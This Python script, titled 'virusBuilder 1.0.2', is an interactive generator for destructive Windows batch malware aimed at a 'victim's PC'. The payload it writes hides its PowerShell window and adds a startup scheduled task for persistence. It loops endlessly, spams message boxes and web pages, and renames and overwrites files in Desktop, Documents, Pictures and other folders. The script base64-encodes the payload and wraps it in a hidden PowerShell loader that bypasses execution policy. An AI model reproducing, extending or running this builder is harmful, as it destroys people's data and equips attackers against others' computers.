import os
import base64

#Title
print("virusBuilder 1.0.2")
print("by VulnerabilityVigilante")
print("\n")



# Get the current user's Downloads folder
downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

#Set virus title
file_name = input("What would you like to name the virus file? (title only, no extensions) ")
file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
print("")
#Managing exceptions for non-permitted characters
while file_name_confirmation != 'y' and file_name_confirmation != 'n':
    print("Please enter either y or n")
    file_name = input("What would you like to name the virus file? (title only, no extensions) ")
    file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
    print("")

#User confirms virus file title. Append .bat extension and set file path for virus writing
if file_name_confirmation == 'y':
    file_path = os.path.join(downloads_folder, file_name)
    print("File created, time to cook up a virus!")
if file_name_confirmation == 'n':
    while file_name_confirmation != 'y':
        file_name = input("What would you like to name the virus file? (title only, no extensions) ")
        file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
        print("")
        while file_name_confirmation != 'y' and file_name_confirmation != 'n':
            print("Please enter either y or n")
            print("")
            file_name = input("What would you like to name the virus file? (title only, no extensions) ")
            file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
            print("")
    print("File created, time to cook up a virus!")
    print("")

#Establish headers
file_name = file_name + ".bat"
file_path = os.path.join(downloads_folder, file_name)
with open(file_path, "w") as file:
    file.write("cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden \"Write-Host\""+ "\n")
    file.write("@echo off \n")
    file.write("schtasks /create /tn \"MyTask\" /tr \"%0\" /sc ONSTART\n")
    file.write(":loop \n")



#Custom Alert Box Option
print("")
customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
#Loop if input is not either "y" or "n"
while customAlertBox != 'y' and customAlertBox != 'n':
        print("Please enter either y or n")
        customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
#If custom alert box option is turned on
if customAlertBox == 'y':
    #Set body of custom alert box
    alertBody = input("What would you like put as the body of the alert box? ")
    alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
    #Managing exceptions for non-permitted characters
    while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
        print("Please enter either y or n")
        alertBody = input("What would you like put as the message of the alert box? ")
        alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
    #User confirms body of alert
    if alertBodyConfirmation == 'y':
        with open(file_path, "a") as file:
            file.write("echo msgbox ")
            file.write("\"" + alertBody + "\" > %temp%\\tmp.vbs\n")
            file.write("start %temp%\\tmp.vbs\n")

    #If user does not confirm body of alert
    else:
        #Loop until user is happy with input
        while alertBodyConfirmation != 'y':
            alertBody = input("What would you like put as the message of the alert box? ")
            alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
            #Loop if user inputs something other than y or x
            while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
                print("Please enter either y or n")
                alertBody = input("What would you like put as the message of the alert box? ")
                alertBodyConfirmation = input("Are you sure you would like to put \"" + alertBody + "\" as your alert message? (y/n) ")

#If custom alerts are turned off
else:
    print("")
    print("Very well, would you like to run the default message or not have alert boxes?")
    print("1: Default Message")
    print("2: No Alert Boxes")
    alertBoxOption = input("Number: ")
    while alertBoxOption != '1' and alertBoxOption != '2':
        print("Please enter 1 or 2")
        print()
        print("Would you like to run the default message or not have alert boxes?")
        print("1: Default Message")
        print("2: No Alert Boxes")
        alertBoxOption = input("Number: ")
    if alertBoxOption == '1':
        print('Using default message: "Click OK"')
        print()
        with open(file_path, "a") as file:
            file.write("echo msgbox \"Click OK\" > %temp%\\tmp.vbs\n")
            file.write("start %temp%\\tmp.vbs\n")
    else:
        print("\nUnderstood. Alert boxes will not be included.")
        print()


#Browser Spam Functionality
browserOption = input("Would you like to spam webpages? (y/n) ")
#Weed out exceptions
while browserOption != 'y' and browserOption != 'n':
    print("Please enter either y or n")
    browserOption = input("Would you like to spam webpages? (y/n) ")
    print()
#If user wants browser spam
if browserOption == 'y':
    webpageAmount = int(input("How many different kinds of websites would you like the virus to open? "))
    web_list = []
    print()
    print("Make sure to format the websites in the following format:")
    print("google.com")
    for i in range(webpageAmount):
        print()
        website = "https://www."
        websiteInput = input("Webpage " + str(i+1) + ": ")
        website += websiteInput
        web_list.append(website)

    #Confirm websites
    print()
    print(web_list)
    web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
    while web_confirmation != 'y' and web_confirmation != 'n': #Weed out non-permitted answers
        print("Please enter either y or n")
        print()
        print(web_list)
        web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
    
    #If user does not want inputted websites
    while web_confirmation == 'n':
        #Loop until user is happy with input
        web_list = []
        print()
        print("Make sure to format the websites in the following format:")
        print("google.com")
        for i in range(webpageAmount):
            print()
            website = "https://www."
            websiteInput = input("Webpage " + str(i + 1) + ": ")
            website += websiteInput
            web_list.append(website)
        #Confirm websites
        print()
        print(web_list)
        web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
        while web_confirmation != 'y' and web_confirmation != 'n': #Weed out non-permitted answers
            print("Please enter either y or n")
            print()
            print(web_list)
            web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
    
    #If user confirms websites, write to batch file
    if web_confirmation == 'y':
        with open(file_path, "a") as file:
            for i in web_list:
                file.write("explorer ")
                file.write("\"")
                file.write(i)
                file.write("\"\n")
else:
    print("Understood. No websites will be spammed.")
    print()









#Overwrite existing files to custom .txt
fileChangeOption = input("\nWould you like to overwrite the files on the victim's PC? (y/n) ")

#Handle exceptions
while fileChangeOption != 'y' and fileChangeOption != 'n':
    print("Please enter either y or n")
    fileChangeOption = input("\nWould you like to overwrite the files on the victim's PC? (y/n) ")
    print()

#If user wants to change files
if (fileChangeOption == 'y'):
    message = input("What would you like to put as the message of the file? ")
    message_confirmation = input("Are you sure you would like to put '" + message + "' as your file message? (y/n) ")
    
    #Managing exceptions for non-permitted characters
    while message_confirmation != 'y' and message_confirmation != 'n':
        print("Please enter either y or n")
        message = input("What would you like put as the message of the file? ")
        message_confirmation = input("Are you sure you would like to put '" + message + "' as your file message? (y/n) ")
    
    #If user confirms message
    if message_confirmation == 'y':
        
        multipleDirectories = input("\nWould you like to change files in multiple directories? (y/n) ")
        while multipleDirectories != 'y' and multipleDirectories != 'n':
            print("Please enter either y or n")
            multipleDirectories = input("Would you like to change files in multiple directories? (y/n) ")
        
        if multipleDirectories == 'y':
            directoryAmount = int(input("How many directories would you like to change files in? "))
            directory_list = []
            print()
            print("Choose from the following options: \n")
            print("1: Desktop\n")
            print("2: Documents\n")
            print("3: Downloads\n")
            print("4: Pictures\n")
            print("5: Videos\n")
            print()

            for i in range(directoryAmount):
                directory = input("Directory " + str(i+1) + ": ")
                if directory == '1':
                    directory = "Desktop"
                if directory == '2':
                    directory = "Documents"
                if directory == '3':
                    directory = "Downloads"
                if directory == '4':
                    directory = "Pictures"
                if directory == '5':
                    directory = "Videos"
                
                directory_list.append(directory)


            

            #Confirm directories
            print()
            print(directory_list)
            directory_confirmation = input("Are you sure you want to use these directories? (y/n) ")
            while directory_confirmation != 'y' and directory_confirmation != 'n': #Weed out non-permitted answers
                print("Please enter either y or n")
                print()
                print(directory_list)
                directory_confirmation = input("Are you sure you want to use these directories? (y/n) ")
        
            #Insert Attack
            with open(file_path, 'r') as file:
                lines = file.readlines()

            # Insert attack
            for (i, directory) in enumerate(directory_list):
                lines.insert(2, 'for %%A in ("%USERPROFILE%\\' + directory + '\\*") do (\n')
                lines.insert(3, '    ren "%%A" "%%~nA.txt"\n')
                lines.insert(4, '    echo ' + message + ' > "%USERPROFILE%\\' + directory + '\\%%~nA.txt"\n')
                lines.insert(5, ')\n')
            
            # Write the new file
            with open(file_path, 'w') as file:
                file.writelines(lines)
        
        if multipleDirectories == 'n':
            print("Choose from the following options: \n")
            print("1: Desktop\n")
            print("2: Documents\n")
            print("3: Downloads\n") 
            print("4: Pictures\n")
            print("5: Videos\n")
            print()


            directory = input("Which directory would you like to change files in? ")
            if directory == '1':
                directory = "Desktop"
            if directory == '2':
                directory = "Documents"
            if directory == '3':
                directory = "Downloads"
            if directory == '4':
                directory = "Pictures"
            if directory == '5':
                directory = "Videos"
            
            with open(file_path, 'r') as file:
                lines = file.readlines()

                # Insert attack
                lines.insert(2, 'for %%A in ("%USERPROFILE%\\' + directory + '\\*") do (\n')
                lines.insert(3, '    ren "%%A" "%%~nA.txt"\n')
                lines.insert(4, '    echo ' + message + ' > "%USERPROFILE%\\' + directory + '\\%%~nA.txt"\n')
                lines.insert(5, ')\n')
            
            # Write the new file
            with open(file_path, 'w') as file:
                file.writelines(lines)

if (fileChangeOption == 'n'):
    print("Understood. No files will be changed.")
    print()







#Batchfile footer to finish loop with no exit
with open(file_path, "a") as file:
    file.write("goto loop\n")

# Open the file in binary mode, read it, encode it and write it back
with open(file_path, 'rb') as file:
    file_content = file.read()

# Encode the file content
encoded_content = base64.b64encode(file_content)


# Write the encoded content back to the file
with open(file_path, 'wb') as file:
    file.write(encoded_content)


# Decode the encoded content to get the base64 string
base64_string = encoded_content.decode('utf-8')

# PowerShell script to decode and run the base64 string
powershell_script = f"""
@echo off
echo powershell.exe -ExecutionPolicy Bypass -File "%~dp0{file_name}" > script.ps1
echo $Base64 = "{base64_string}" >> script.ps1
echo $DecodedBytes = [System.Convert]::FromBase64String($Base64) >> script.ps1
echo $DecodedString = [System.Text.Encoding]::UTF8.GetString($DecodedBytes) >> script.ps1


echo $TempFile = [System.IO.Path]::GetTempFileName() + ".bat" >> script.ps1
echo [System.IO.File]::WriteAllText($TempFile, $DecodedString) >> script.ps1


echo cmd /c $TempFile >> script.ps1


echo Remove-Item $TempFile >> script.ps1
attrib +s +h script.ps1

powershell -ExecutionPolicy Bypass -File "script.ps1"
"""

# Write the PowerShell script to the file
with open(file_path, 'w') as file:
    file.write(powershell_script)

print("")
print("Virus created, check it out at " + file_path) 